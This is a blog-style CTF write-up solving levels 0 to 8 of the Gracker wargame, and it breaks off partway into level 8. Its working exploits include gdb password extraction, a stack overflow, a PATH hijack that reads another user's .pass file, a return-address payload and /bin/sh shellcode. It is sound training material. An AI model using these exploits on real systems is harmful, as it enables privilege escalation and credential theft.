---
title: "Relearning CTF Logic I: Gracker"
date: "2023-01-01T11:59:59.999Z"
description: "Relearning knowledge previously forgotten"
author: "ZyphenSVC"
slug: "posts/gracker-solves/2023-01-01-relearning-ctf"
---

# Forenote

This first semester of university has progressed without me touching any cybersecurity from summer onwards. I forgotten a lot of content. This series will be an effort to relearn all content from scratch and also complete competitions as a deep dive into this world.

# Gracker Level 0

Coming into the /gracker platform, we find that after reading the story that there is a program at `/matrix/level0/level0`. Let's run it.

```
 _____
| _ _ |
|| | || Hidden
||_|_||   Backdoor
| _ _ o  by 
|| | ||     ~Zero Cool
||_|_||  
|_____|

Enter Secret Password:
password
wrong!%
```

This is what we are greeted with.

In order to ensure relearning on this platform, I will be sticking to gdb as much as possible. So lets run `gdb /matrix/level0/level0` and run `info func` to see the functions.

Out of these functions, main should stick out. Using `disas main` on this function let's us see the assembly code fo this.

```
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004007ed <+0>:     push   %rbp
   0x00000000004007ee <+1>:     mov    %rsp,%rbp
   0x00000000004007f1 <+4>:     sub    $0x40,%rsp
   0x00000000004007f5 <+8>:     mov    %edi,-0x34(%rbp)
   0x00000000004007f8 <+11>:    mov    %rsi,-0x40(%rbp)
   0x00000000004007fc <+15>:    mov    $0x400920,%edi
   0x0000000000400801 <+20>:    callq  0x4005e0 <puts@plt>
   0x0000000000400806 <+25>:    lea    -0x30(%rbp),%rax
   0x000000000040080a <+29>:    mov    $0x20,%edx
   0x000000000040080f <+34>:    mov    %rax,%rsi
   0x0000000000400812 <+37>:    mov    $0x0,%edi
   0x0000000000400817 <+42>:    callq  0x400650 <read@plt>
   0x000000000040081c <+47>:    movb   $0x0,-0x11(%rbp)
   0x0000000000400820 <+51>:    lea    -0x30(%rbp),%rax
   0x0000000000400824 <+55>:    mov    $0xa,%esi
   0x0000000000400829 <+60>:    mov    %rax,%rdi
   0x000000000040082c <+63>:    callq  0x400620 <strchr@plt>
   0x0000000000400831 <+68>:    mov    %rax,-0x8(%rbp)
   0x0000000000400835 <+72>:    cmpq   $0x0,-0x8(%rbp)
   0x000000000040083a <+77>:    je     0x400843 <main+86>
   0x000000000040083c <+79>:    mov    -0x8(%rbp),%rax
   0x0000000000400840 <+83>:    movb   $0x0,(%rax)
   0x0000000000400843 <+86>:    lea    -0x30(%rbp),%rax
   0x0000000000400847 <+90>:    mov    $0x600df0,%esi
   0x000000000040084c <+95>:    mov    %rax,%rdi
   0x000000000040084f <+98>:    callq  0x400670 <strcmp@plt>
   0x0000000000400854 <+103>:   test   %eax,%eax
   0x0000000000400856 <+105>:   jne    0x40086e <main+129>
   0x0000000000400858 <+107>:   mov    $0x4009a0,%edi
   0x000000000040085d <+112>:   callq  0x4005e0 <puts@plt>
   0x0000000000400862 <+117>:   mov    $0x0,%eax
   0x0000000000400867 <+122>:   callq  0x400796 <spawn_shell>
   0x000000000040086c <+127>:   jmp    0x40087d <main+144>
   0x000000000040086e <+129>:   mov    $0x400a19,%edi
   0x0000000000400873 <+134>:   mov    $0x0,%eax
   0x0000000000400878 <+139>:   callq  0x400630 <printf@plt>
   0x000000000040087d <+144>:   mov    $0x0,%eax
   0x0000000000400882 <+149>:   leaveq 
   0x0000000000400883 <+150>:   retq   
End of assembler dump.
```

We can run through this program, each line of the assembly, but that seems useless, the most import part is near the `strcmp` function.

```
   0x0000000000400843 <+86>:    lea    -0x30(%rbp),%rax
   0x0000000000400847 <+90>:    mov    $0x600df0,%esi
   0x000000000040084c <+95>:    mov    %rax,%rdi
   0x000000000040084f <+98>:    callq  0x400670 <strcmp@plt>
   0x0000000000400854 <+103>:   test   %eax,%eax
   0x0000000000400856 <+105>:   jne    0x40086e <main+129>
   0x0000000000400858 <+107>:   mov    $0x4009a0,%edi
   0x000000000040085d <+112>:   callq  0x4005e0 <puts@plt>
```

There is a pointer being moved into the memory at %esi. Let's check out what this pointer consists of.

```
(gdb) x/s 0x600df0
0x600df0 <secret_password>:     "s3cr3t_backd00r_passw0rd"
```

We got the password! Let's input it into the program and get the flag.

# Gracker Level 1

This program was a bit more simplistic by asking us for a password and accepting or rejecting. However, there was a difference. It put the `/bin/sh` command in a different method, which means we can call it without issue.

This is the main method.

```
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040083d <+0>:     push   %rbp
   0x000000000040083e <+1>:     mov    %rsp,%rbp
   0x0000000000400841 <+4>:     push   %rbx
   0x0000000000400842 <+5>:     sub    $0x48,%rsp
   0x0000000000400846 <+9>:     mov    %edi,-0x44(%rbp)
   0x0000000000400849 <+12>:    mov    %rsi,-0x50(%rbp)
   0x000000000040084d <+16>:    mov    $0x4009b0,%edi
   0x0000000000400852 <+21>:    callq  0x400620 <puts@plt>
   0x0000000000400857 <+26>:    lea    -0x40(%rbp),%rax
   0x000000000040085b <+30>:    mov    $0x20,%edx
   0x0000000000400860 <+35>:    mov    %rax,%rsi
   0x0000000000400863 <+38>:    mov    $0x0,%edi
   0x0000000000400868 <+43>:    callq  0x4006a0 <read@plt>
   0x000000000040086d <+48>:    movb   $0x0,-0x21(%rbp)
   0x0000000000400871 <+52>:    lea    -0x40(%rbp),%rax
   0x0000000000400875 <+56>:    mov    $0xa,%esi
   0x000000000040087a <+61>:    mov    %rax,%rdi
   0x000000000040087d <+64>:    callq  0x400670 <strchr@plt>
   0x0000000000400882 <+69>:    mov    %rax,-0x20(%rbp)
   0x0000000000400886 <+73>:    cmpq   $0x0,-0x20(%rbp)
   0x000000000040088b <+78>:    je     0x400894 <main+87>
   0x000000000040088d <+80>:    mov    -0x20(%rbp),%rax
   0x0000000000400891 <+84>:    movb   $0x0,(%rax)
   0x0000000000400894 <+87>:    movl   $0x0,-0x14(%rbp)
   0x000000000040089b <+94>:    jmp    0x4008c1 <main+132>
   0x000000000040089d <+96>:    mov    -0x14(%rbp),%eax
   0x00000000004008a0 <+99>:    cltq   
   0x00000000004008a2 <+101>:   movzbl 0x600e40(%rax),%eax
   0x00000000004008a9 <+108>:   movzbl 0x2005ad(%rip),%edx        # 0x600e5d <XORkey>
   0x00000000004008b0 <+115>:   xor    %eax,%edx
   0x00000000004008b2 <+117>:   mov    -0x14(%rbp),%eax
   0x00000000004008b5 <+120>:   cltq   
   0x00000000004008b7 <+122>:   mov    %dl,0x600e40(%rax)
   0x00000000004008bd <+128>:   addl   $0x1,-0x14(%rbp)
   0x00000000004008c1 <+132>:   mov    -0x14(%rbp),%eax
   0x00000000004008c4 <+135>:   movslq %eax,%rbx
   0x00000000004008c7 <+138>:   mov    $0x600e40,%edi
   0x00000000004008cc <+143>:   callq  0x400640 <strlen@plt>
   0x00000000004008d1 <+148>:   cmp    %rax,%rbx
   0x00000000004008d4 <+151>:   jb     0x40089d <main+96>
   0x00000000004008d6 <+153>:   lea    -0x40(%rbp),%rax
   0x00000000004008da <+157>:   mov    $0x600e40,%esi
   0x00000000004008df <+162>:   mov    %rax,%rdi
   0x00000000004008e2 <+165>:   callq  0x4006c0 <strcmp@plt>
   0x00000000004008e7 <+170>:   test   %eax,%eax
   0x00000000004008e9 <+172>:   jne    0x400901 <main+196>
   0x00000000004008eb <+174>:   mov    $0x4009e0,%edi
   0x00000000004008f0 <+179>:   callq  0x400620 <puts@plt>
   0x00000000004008f5 <+184>:   mov    $0x0,%eax
   0x00000000004008fa <+189>:   callq  0x4007e6 <spawn_shell>
---Type <return> to continue, or q <return> to quit---
   0x00000000004008ff <+194>:   jmp    0x400910 <main+211>
   0x0000000000400901 <+196>:   mov    $0x400a59,%edi
   0x0000000000400906 <+201>:   mov    $0x0,%eax
   0x000000000040090b <+206>:   callq  0x400680 <printf@plt>
   0x0000000000400910 <+211>:   mov    $0x0,%eax
   0x0000000000400915 <+216>:   add    $0x48,%rsp
   0x0000000000400919 <+220>:   pop    %rbx
   0x000000000040091a <+221>:   pop    %rbp
   0x000000000040091b <+222>:   retq   
```

We notice that there is a function call to `spawn_shell`, so let's check out the code to that.

```
(gdb) disas spawn_shell
Dump of assembler code for function spawn_shell:
   0x00000000004007e6 <+0>:     push   %rbp
   0x00000000004007e7 <+1>:     mov    %rsp,%rbp
   0x00000000004007ea <+4>:     sub    $0x10,%rsp
   0x00000000004007ee <+8>:     callq  0x4006e0 <getegid@plt>
   0x00000000004007f3 <+13>:    mov    %eax,-0x4(%rbp)
   0x00000000004007f6 <+16>:    callq  0x400690 <geteuid@plt>
   0x00000000004007fb <+21>:    mov    %eax,-0x8(%rbp)
   0x00000000004007fe <+24>:    mov    -0x4(%rbp),%edx
   0x0000000000400801 <+27>:    mov    -0x4(%rbp),%ecx
   0x0000000000400804 <+30>:    mov    -0x4(%rbp),%eax
   0x0000000000400807 <+33>:    mov    %ecx,%esi
   0x0000000000400809 <+35>:    mov    %eax,%edi
   0x000000000040080b <+37>:    mov    $0x0,%eax
   0x0000000000400810 <+42>:    callq  0x400650 <setresgid@plt>
   0x0000000000400815 <+47>:    mov    -0x8(%rbp),%edx
   0x0000000000400818 <+50>:    mov    -0x8(%rbp),%ecx
   0x000000000040081b <+53>:    mov    -0x8(%rbp),%eax
   0x000000000040081e <+56>:    mov    %ecx,%esi
   0x0000000000400820 <+58>:    mov    %eax,%edi
   0x0000000000400822 <+60>:    mov    $0x0,%eax
   0x0000000000400827 <+65>:    callq  0x400630 <setresuid@plt>
   0x000000000040082c <+70>:    mov    $0x4009a8,%edi
   0x0000000000400831 <+75>:    mov    $0x0,%eax
   0x0000000000400836 <+80>:    callq  0x400660 <system@plt>
   0x000000000040083b <+85>:    leaveq 
   0x000000000040083c <+86>:    retq   
End of assembler dump.
```

This shows that there is not a a jne or jz code in our disassembly, which means we can call the function with no problems. Let's do that.

```
(gdb) b main
Breakpoint 1 at 0x400841
(gdb) r
Starting program: /matrix/level1/level1 

Breakpoint 1, 0x0000000000400841 in main ()
(gdb) jump *0x4007e6
Continuing at 0x4007e6.
$
```

However, I noticed that this logged me in as level1, which is not what we wanted.

OK then... I will solve this the real way. Let's set a breakpoint at the strcmp and find the value it is comparing against.

```
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040083d <+0>:     push   %rbp
   0x000000000040083e <+1>:     mov    %rsp,%rbp
   0x0000000000400841 <+4>:     push   %rbx
   0x0000000000400842 <+5>:     sub    $0x48,%rsp
   0x0000000000400846 <+9>:     mov    %edi,-0x44(%rbp)
   0x0000000000400849 <+12>:    mov    %rsi,-0x50(%rbp)
   0x000000000040084d <+16>:    mov    $0x4009b0,%edi
   0x0000000000400852 <+21>:    callq  0x400620 <puts@plt>
   0x0000000000400857 <+26>:    lea    -0x40(%rbp),%rax
   0x000000000040085b <+30>:    mov    $0x20,%edx
   0x0000000000400860 <+35>:    mov    %rax,%rsi
   0x0000000000400863 <+38>:    mov    $0x0,%edi
   0x0000000000400868 <+43>:    callq  0x4006a0 <read@plt>
   0x000000000040086d <+48>:    movb   $0x0,-0x21(%rbp)
   0x0000000000400871 <+52>:    lea    -0x40(%rbp),%rax
   0x0000000000400875 <+56>:    mov    $0xa,%esi
   0x000000000040087a <+61>:    mov    %rax,%rdi
   0x000000000040087d <+64>:    callq  0x400670 <strchr@plt>
   0x0000000000400882 <+69>:    mov    %rax,-0x20(%rbp)
   0x0000000000400886 <+73>:    cmpq   $0x0,-0x20(%rbp)
   0x000000000040088b <+78>:    je     0x400894 <main+87>
   0x000000000040088d <+80>:    mov    -0x20(%rbp),%rax
   0x0000000000400891 <+84>:    movb   $0x0,(%rax)
   0x0000000000400894 <+87>:    movl   $0x0,-0x14(%rbp)
   0x000000000040089b <+94>:    jmp    0x4008c1 <main+132>
   0x000000000040089d <+96>:    mov    -0x14(%rbp),%eax
   0x00000000004008a0 <+99>:    cltq   
   0x00000000004008a2 <+101>:   movzbl 0x600e40(%rax),%eax
   0x00000000004008a9 <+108>:   movzbl 0x2005ad(%rip),%edx        # 0x600e5d <XORkey>
   0x00000000004008b0 <+115>:   xor    %eax,%edx
   0x00000000004008b2 <+117>:   mov    -0x14(%rbp),%eax
   0x00000000004008b5 <+120>:   cltq   
   0x00000000004008b7 <+122>:   mov    %dl,0x600e40(%rax)
   0x00000000004008bd <+128>:   addl   $0x1,-0x14(%rbp)
   0x00000000004008c1 <+132>:   mov    -0x14(%rbp),%eax
   0x00000000004008c4 <+135>:   movslq %eax,%rbx
   0x00000000004008c7 <+138>:   mov    $0x600e40,%edi
   0x00000000004008cc <+143>:   callq  0x400640 <strlen@plt>
   0x00000000004008d1 <+148>:   cmp    %rax,%rbx
   0x00000000004008d4 <+151>:   jb     0x40089d <main+96>
   0x00000000004008d6 <+153>:   lea    -0x40(%rbp),%rax
   0x00000000004008da <+157>:   mov    $0x600e40,%esi
   0x00000000004008df <+162>:   mov    %rax,%rdi
=> 0x00000000004008e2 <+165>:   callq  0x4006c0 <strcmp@plt>
   0x00000000004008e7 <+170>:   test   %eax,%eax
   0x00000000004008e9 <+172>:   jne    0x400901 <main+196>
   0x00000000004008eb <+174>:   mov    $0x4009e0,%edi
   0x00000000004008f0 <+179>:   callq  0x400620 <puts@plt>
   0x00000000004008f5 <+184>:   mov    $0x0,%eax
   0x00000000004008fa <+189>:   callq  0x4007e6 <spawn_shell>
---Type <return> to continue, or q <return> to quit---q
Quit
```

The value we want to look at now is the pointer `$0x600e40`,

```
(gdb) x/s 0x600e40
0x600e40 <secret_password>:     "n0b0dy_gu3sses_thi5_passw0rd"
```

Let's run this program in the terminal with the new password, and get the flag.


# Gracker Level 2

```
~Zero Cool Simple Backdoor v3~
Enter Password:
password
wrong!%
```

The story said it was similar to the last level, but a slight modification. Let's try the same method again then.

```
(gdb) b *0x00000000004008e0
Breakpoint 1 at 0x4008e0
(gdb) b main
Breakpoint 2 at 0x400841
(gdb) r
Starting program: /matrix/level2/level2 

Breakpoint 2, 0x0000000000400841 in main ()
(gdb) c
Continuing.
~Zero Cool Simple Backdoor v3~
Enter Password:
password

Breakpoint 1, 0x00000000004008e0 in main ()
(gdb) x/s 0x600e60
0x600e60 <secret_password>:     ")q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r"
(gdb) 
```

Interesting, it is still encrypted. What seems to be happening is that our encrypted string is being compared to the password also encrypted. So let's go to the xor, and find the actual string.

Inputting `)q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r` as the password will hopefully get us the xor of the password.

```
(gdb) b *0x00000000004008e0
Breakpoint 1 at 0x4008e0
(gdb) r
Starting program: /matrix/level2/level2 
~Zero Cool Simple Backdoor v3~
Enter Password:
)q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r

Breakpoint 1, 0x00000000004008e0 in main ()
(gdb) 036'q--q6(/&\036,r
Undefined command: "036".  Try "help".
(gdb) x/s 0x600e60
0x600e60 <secret_password>:     ")q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r"
(gdb) print $esi
$1 = 6295136
(gdb) x/s $esi
0x600e60 <secret_password>:     ")q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r"
(gdb) x/s $rax
0x7fffffffeac0: "h0w\035qrwis\035qrw\035qwth1s\035qrwh4\035ck3r"
(gdb) x/s $rdi
0x7fffffffeac0: "h0w\035qrwis\035qrw\035qwth1s\035qrwh4\035ck3r"
```

Oooo, this is interesting. I noted that there is `\x035` being repeated throughout the password. So let's fix this in the secret.

Let's input a password of `)q66(26A)p26u"*r36'q--q6(/&6,r"`, and this time we get a secret of `h0wwisw`. Wait a minute... isnt this similar to:

```
(gdb) x/s $rax
0x7fffffffeac0: "h0w\035qrwis\035qrw\035qwth1s\035qrwh4\035ck3r"
```

Let's extract the unique characters from that register. `h0wwiswth1swh4ck3r`, and I took note that every `w` can be a position of `_`. So we are left with `h0w_is_th1s_h4ck3r`.

When inputted as the password, we get the origins to the old xor. `)q6\036(2\036\065)p2\036)u\"*r3`. That's great!

By appending the rest of the string from the encrypted `secret_passsword`, we are getting closer to the real message.

```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /matrix/level2/level2 
~Zero Cool Simple Backdoor v3~
Enter Password:
h0w_is_th1s_h4ck3r_'q--q6(/&_,r"

Breakpoint 3, 0x00000000004008e0 in main ()
(gdb) 
(gdb) x/s $rax
0x7fffffffeac0: ")q6\036(2\036\065)p2\036)u\"*r3\036f0ll0wing\036m3"
```

Let's input these last two parts.

```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /matrix/level2/level2 
~Zero Cool Simple Backdoor v3~
Enter Password:
h0w_is_th1s_h4ck3r_f0ll0wing_m3

Breakpoint 3, 0x00000000004008e0 in main ()
(gdb) x/s $rax
0x7fffffffeac0: ")q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r"
(gdb) 
(gdb) c
Continuing.
Correct! Here is the level3 shell.
Read the level3 password in /home/level3/.pass to login with `ssh level3@gracker.org`
$ 
```

We got the shell!

Reading the recap in the next level this is the solution:

```python
>>> pw = ""
>>> for c in ")q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r":
...  pw += chr(ord(c)^0x41)
...
>>> print pw
h0w_is_th1s_h4ck3r_f0ll0wing_m3
```

This is a lot simpler than I though :v.

# Gracker Level 3

```
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400718 <+0>:     push   %rbp
   0x0000000000400719 <+1>:     mov    %rsp,%rbp
   0x000000000040071c <+4>:     sub    $0x60,%rsp
   0x0000000000400720 <+8>:     mov    %edi,-0x54(%rbp)
   0x0000000000400723 <+11>:    mov    %rsi,-0x60(%rbp)
   0x0000000000400727 <+15>:    movl   $0x0,-0x4(%rbp)
   0x000000000040072e <+22>:    mov    $0x400800,%edi
   0x0000000000400733 <+27>:    callq  0x400540 <puts@plt>
   0x0000000000400738 <+32>:    lea    -0x50(%rbp),%rax
   0x000000000040073c <+36>:    mov    %rax,%rdi
   0x000000000040073f <+39>:    callq  0x4005b0 <gets@plt>
   0x0000000000400744 <+44>:    mov    -0x4(%rbp),%eax
   0x0000000000400747 <+47>:    test   %eax,%eax
   0x0000000000400749 <+49>:    je     0x400761 <main+73>
   0x000000000040074b <+51>:    mov    $0x400828,%edi
   0x0000000000400750 <+56>:    callq  0x400540 <puts@plt>
   0x0000000000400755 <+61>:    mov    $0x0,%eax
   0x000000000040075a <+66>:    callq  0x4006c6 <spawn_shell>
   0x000000000040075f <+71>:    jmp    0x40076b <main+83>
   0x0000000000400761 <+73>:    mov    $0x400891,%edi
   0x0000000000400766 <+78>:    callq  0x400540 <puts@plt>
   0x000000000040076b <+83>:    leaveq 
   0x000000000040076c <+84>:    retq   
End of assembler dump.
(gdb) 
```

Surprisingly this works.

```
Zero Cool - Bugdoor v4
Enter Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
How can this happen? The variable is set to 0 and is never modified in between O.o
You must be a hacker!
$ 
```

Upon reading the recap of the next level, this is the logic behind it all.

```
gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000400718 <+0>:     push   rbp
   0x0000000000400719 <+1>:     mov    rbp,rsp
   0x000000000040071c <+4>:     sub    rsp,0x60
   0x0000000000400720 <+8>:     mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400723 <+11>:    mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400727 <+15>:    mov    DWORD PTR [rbp-0x4],0x0    ; this seems to be the location of the admin_enabled variable. Because it's set to 0.
   0x000000000040072e <+22>:    mov    edi,0x400800
   0x0000000000400733 <+27>:    call   0x400540 <puts@plt>
   0x0000000000400738 <+32>:    lea    rax,[rbp-0x50]
   0x000000000040073c <+36>:    mov    rdi,rax
   0x000000000040073f <+39>:    call   0x4005b0 <gets@plt>
   0x0000000000400744 <+44>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400747 <+47>:    test   eax,eax                    ; set breakpoint here. after the gets(), and the admin_enabled variable is loaded into eax
   0x0000000000400749 <+49>:    je     0x400761 <main+73>
   0x000000000040074b <+51>:    mov    edi,0x400828
   0x0000000000400750 <+56>:    call   0x400540 <puts@plt>
   0x0000000000400755 <+61>:    mov    eax,0x0
   0x000000000040075a <+66>:    call   0x4006c6 <spawn_shell>
   0x000000000040075f <+71>:    jmp    0x40076b <main+83>
   0x0000000000400761 <+73>:    mov    edi,0x400891
   0x0000000000400766 <+78>:    call   0x400540 <puts@plt>
   0x000000000040076b <+83>:    leave
   0x000000000040076c <+84>:    ret
End of assembler dump.
(gdb) break *0x0000000000400747
Breakpoint 1 at 0x400747
(gdb) r
Starting program: /matrix/level3/level3
Zero Cool - Bugdoor v4
Enter Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                             ; let's put in a bunch of A. 

Breakpoint 1, 0x0000000000400747 in main ()
(gdb) x/32x $rsp                                                   ; then we look at the stack after the input was placed in the buffer
0x7fff97737820: 0x97737968  0x00007fff  0x412b44c0  0x00000001     ; all those 0x41 are our "A". The ascii character A has the value 65
0x7fff97737830: 0x41414141  0x41414141  0x41414141  0x41414141     ; or 0x41 in hex. You can see all ascii values with `man ascii`
0x7fff97737840: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fff97737850: 0x41414141  0x00004141  0x00000000  0x00000000
0x7fff97737860: 0x00400770  0x00000000  0x004005d0  0x00000000
0x7fff97737870: 0x97737960  0x00007fff  0x00000000  0x00000000
0x7fff97737880: 0x00000000  0x00000000  0x40d0db45  0x00007fce
0x7fff97737890: 0x00000000  0x00000000  0x97737968  0x00007fff
(gdb) x $rbp-0x4                                                   ; read the admin_enabled variable
0x7fff9773787c: 0x00000000
(gdb) info register eax                                            ; just to make sure. This is admin_enabled loaded into eax for the test branch
eax            0x0  0                                              ; but it's still 0.
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /matrix/level3/level3
Zero Cool - Bugdoor v4                                             ; now let's restart and put in a bunch more
Enter Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0000000000400747 in main ()
(gdb) x/32x $rsp                                                   ; stack looks very full with As
0x7ffe1e40c2b0: 0x1e40c3f8  0x00007ffe  0xfbecb4c0  0x00000001
0x7ffe1e40c2c0: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c2d0: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c2e0: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c2f0: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c300: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c310: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c320: 0x41414141  0x41414141  0x41414141  0x41414141
(gdb) x $rbp-0x4                                                   ; and it looks like that admin_enabled got overwritten with AAAA as well.
0x7ffe1e40c30c: 0x41414141
(gdb) info register eax                                            ; yup. eax is not 0 anymore.
eax            0x41414141   1094795585
(gdb)
```

# Gracker Level 4

This was a bit complicated, but after a bit of research I was able to reset the environment variable, `PATH`, and create files in the /tmp/ directory to replace the commands used in the program.

```
level4@gracker:~$ touch /tmp/uname
level4@gracker:~$ cat /tmp/uname
#!/bin/bash
/bin/sh
level4@gracker:~$ export
HOME=/home/level4
LANG=en_US.UTF-8
LANGUAGE=en_US:en
LC_ALL=en_US.UTF-8
LOGNAME=level4
MAIL=/var/mail/level4
PATH=/usr/sbin/:/sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
SHELL=/usr/bin/zsh
SSH_CLIENT='71.140.148.118 55926 22'
SSH_CONNECTION='71.140.148.118 55926 5.45.103.62 22'
SSH_TTY=/dev/pts/4
TERM=xterm-256color
USER=level4
XDG_RUNTIME_DIR=/run/user/1004
XDG_SESSION_ID=34440
level4@gracker:~$ PATH=/tmp /matrix/level4/level4 
Zero Cool - Linux Information Gathering Tool v1.2

[*] Get system information:
sh: 1: uname: Permission denied

[*] Find users available on this system:
sh: 1: cut: Permission denied

[*] Search for setuid binaries:
ls
ls
^C%                                                                                                                  level4@gracker:~$ chmod 777 /tmp/uname
level4@gracker:~$ PATH=/tmp /matrix/level4/level4
Zero Cool - Linux Information Gathering Tool v1.2

[*] Get system information:
sh: 1: uname: Permission denied

[*] Find users available on this system:
sh: 1: cut: Permission denied

[*] Search for setuid binaries:
ls
cat
level4@gracker:~$ nano /tmp/uname               
level4@gracker:~$ PATH=/tmp /matrix/level4/level4
Zero Cool - Linux Information Gathering Tool v1.2

[*] Get system information:
sh: 1: uname: Permission denied

[*] Find users available on this system:
sh: 1: cut: Permission denied

[*] Search for setuid binaries:
FLAG
level4@gracker:~$ cat /tmp/uname
#!/bin/sh
/bin/cat /home/level5/.pass
```

# Gracker Level 5

It wants us to run an nmap scan. This is great! I remember how to do this.

```
level5@gracker:~$ python -c "print int(0x5ad)"
1453
level5@gracker:~$ python -c "print int(0xdad)"
3501
level5@gracker:~$ nmap -sS -sC -sV -p1453-3501 localhost
You requested a scan type which requires root privileges.
QUITTING!
level5@gracker:~$ nmap -sC -sV -p1453-3501 localhost
[TOOK TOO LONG]
level5@gracker:~$ nmap -p1453-3501 127.0.0.1    

Starting Nmap 6.47 ( http://nmap.org ) at 2022-12-30 18:19 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (1.00s latency).
Not shown: 2048 closed ports
PORT     STATE SERVICE
2989/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 98.53 seconds
```

Port 2989 is open. Let's attempt to connect to it using netcat.

```
level5@gracker:~$ nc localhost 2989
$ whoami
flynn
$ uname -a
SolarOs 4.0.1 Generic_50203-02 sun4m i386
Unknown.Unknown
$ login -n root
Login incorrect
login: backdoor
No home directory specified in password file!
Logging in with home=/
# bin/history
  499 kill 2208
  500 ps -a -x -u
  501 touch /opt/LLL/run/ok
  502 LLLSDLaserControl -ok 1
# ls
# ls -la
# 
Broadcast message from ZeroCool@h4xx0r (pts/0) (Oct 21 16:29:00 2015):

You are too slow.
Mess With the Best, Die Like the Rest!
```

This is odd... We are unable to run any commands. 

Messing around for a while got me to this result.

```
# bin/history
  499 kill 2208
  500 ps -a -x -u
  501 touch /opt/LLL/run/ok
  502 LLLSDLaserControl -ok 1
# LLLSDLaserControl
You entered the Grid!

level6@TRON:~$ %
```

However, it continued to log me out. We seem to have a need to work on speed. Having the commands on speeddial (copy and paste), I was able to get the FLAG.

# Gracker Level 6

```
level6@gracker:~$ /matrix/level6/level6 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
What are you doing here? Are you a user or a program?
Where did you come from? Proof your identity:
Return to: 0x8004141
```

This is a case of return pointers being expressed through this program. But note that the `0x41` indicates the A's I inputted into the parameters.

Pulling up gdb allows us to get to this method pointer to return.

```
(gdb) info func
All defined functions:

Non-debugging symbols:
0x080483a0  _init
0x080483e0  setresuid@plt
0x080483f0  printf@plt
0x08048400  geteuid@plt
0x08048410  getegid@plt
0x08048420  strcpy@plt
0x08048430  puts@plt
0x08048440  system@plt
0x08048450  __gmon_start__@plt
0x08048460  exit@plt
0x08048470  __libc_start_main@plt
0x08048480  setresgid@plt
0x08048490  _start
0x080484c0  __x86.get_pc_thunk.bx
0x080484d0  deregister_tm_clones
0x08048500  register_tm_clones
0x08048540  __do_global_dtors_aux
0x08048560  frame_dummy
0x0804858b  spawn_shell
0x080485eb  gates_of_arjia
0x08048619  main
0x080486a0  __libc_csu_init
0x08048710  __libc_csu_fini
0x08048714  _fini
(gdb) quit
```

spawn_shell is our pointer, so let's route it using endianess.

```
level6@gracker:~$ /matrix/level6/level6 `echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8b\x85\x04\x08'`    
Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
What are you doing here? Are you a user or a program?
Where did you come from? Proof your identity:
Return to: 0x804858b
Welcome to Arjia City!
$ whoami
level7
$ 
```

# Gracker Level 7

This level featured involving using shellcode, this is easy. Just go find any /bin/bash or /bin/sh scripts from [shell-storm](https://shell-storm.org/shellcode/files/shellcode-606.html). This was mine. Then we can input it into the program as such:

```
level7@gracker:~$ /matrix/level7/level7 `echo "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x1\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"`
Hello user.
You can create a new program in the TRON system that will live in Arjia City:
bash-4.3$ ls
iwashere  recap  story  welcome
bash-4.3$ whoami
level8
```

# Gracker Level 8

```
Let's create our own test binary in /tmp

    level8@gracker:/matrix/level8$ cd /tmp
    level8@gracker:/tmp$ mkdir l8tmp
    level8@gracker:/tmp$ cd l8tmp
    level8@gracker:/tmp/l8tmp$ cp /matrix/level8/level8.c .
    level8@gracker:/tmp/l8tmp$ vim level8.c # modify sourcecode file path
    level8@gracker:/tmp/l8tmp$ cat level8.c
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    #include <fcntl.h>

    // gcc level8.c -o level8 -m32

    int main() {
        char *pos;
        char buffer[512];
        char password[32];

        int fp = open("pass", O_RDONLY);

        read(fp, password, 32);
        if ((pos=strchr(password, '\n')) != NULL) *pos = '\0';
        password[31] = '\0';

        printf("What is your name?\n");
        fflush(stdout);
        fgets(buffer, sizeof(buffer), stdin);
        if ((pos=strchr(buffer, '\n')) != NULL) *pos = '\0';
        password[511] = '\0';

        printf(buffer);

